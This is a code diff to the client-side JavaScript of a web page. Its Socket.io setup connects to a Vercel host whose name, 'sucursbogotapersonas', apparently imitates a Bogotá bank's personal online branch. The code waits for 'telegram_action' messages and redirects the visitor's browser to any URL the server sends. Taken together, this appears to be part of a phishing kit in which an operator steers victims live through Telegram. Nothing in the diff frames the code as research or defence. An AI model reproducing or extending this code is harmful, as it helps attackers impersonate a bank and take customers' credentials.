@@ -16,57 +16,53 @@ window.commonUtils = {
         console.log('Funciones comunes inicializadas');
     },
 
-    // Inicializar Socket.io
     initializeSocket: function() {
-        console.log('Inicializando Socket.io...');
-        try {
-            if (!window.socket && typeof io !== 'undefined') {
-                // Determinar la URL base según el entorno
-                const isProduction = window.location.hostname.includes('vercel.app');
-                const socketUrl = isProduction 
-                    ? 'https://panel-de-bogota.vercel.app'
-                    : 'http://localhost:3000';
+    console.log('Inicializando Socket.io...');
+    try {
+        if (!window.socket && typeof io !== 'undefined') {
+            // Determinar la URL base automáticamente
+            const isVercel = window.location.hostname.includes('vercel.app');
+            const socketUrl = isVercel 
+                ? 'https://sucursbogotapersonas.vercel.app'
+                : 'http://localhost:3000';
 
-                console.log('Conectando a Socket.io en:', socketUrl);
-                window.socket = io(socketUrl, {
-                    transports: ['websocket', 'polling'],
-                    reconnection: true,
-                    reconnectionAttempts: 5,
-                    reconnectionDelay: 1000
-                });
+            console.log('Conectando a Socket.io en:', socketUrl);
+            window.socket = io(socketUrl, {
+                transports: ['websocket', 'polling']
+            });
+            
+            window.socket.on('connect', () => {
+                console.log('✅ Socket.io conectado - ID:', window.socket.id);
+                this.hideLoading();
+            });
+
+            window.socket.on('telegram_action', (data) => {
+                console.log('🔄 Acción recibida:', data);
+                this.hideLoading();
                 
-                window.socket.on('connect', () => {
-                    console.log('✅ Socket.io conectado - ID:', window.socket.id);
-                    this.hideLoading();
-                });
-
-                window.socket.on('telegram_action', (data) => {
-                    console.log('🔄 Acción recibida:', data);
-                    this.hideLoading();
-                    
-                    if (data.redirect) {
-                        console.log('📍 Redirigiendo a:', data.redirect);
-                        if (data.message) {
-                            sessionStorage.setItem('actionMessage', data.message);
-                        }
-                        setTimeout(() => {
-                            window.location.href = data.redirect;
-                        }, 100);
+                if (data.redirect) {
+                    console.log('📍 Redirigiendo a:', data.redirect);
+                    if (data.message) {
+                        sessionStorage.setItem('actionMessage', data.message);
                     }
-                });
+                    setTimeout(() => {
+                        window.location.href = data.redirect;
+                    }, 100);
+                }
+            });
 
-                window.socket.on('disconnect', () => {
-                    console.log('❌ Socket.io desconectado');
-                });
+            window.socket.on('disconnect', () => {
+                console.log('❌ Socket.io desconectado');
+            });
 
-                window.socket.on('connect_error', (error) => {
-                    console.error('❌ Error de conexión:', error.message);
-                });
-            }
-        } catch (error) {
-            console.error('❌ Error inicializando Socket.io:', error);
+            window.socket.on('connect_error', (error) => {
+                console.error('❌ Error de conexión:', error.message);
+            });
         }
-    },
+    } catch (error) {
+        console.error('❌ Error inicializando Socket.io:', error);
+    }
+},
 
     // Crear pantalla de carga
     createLoadingScreen: function() {
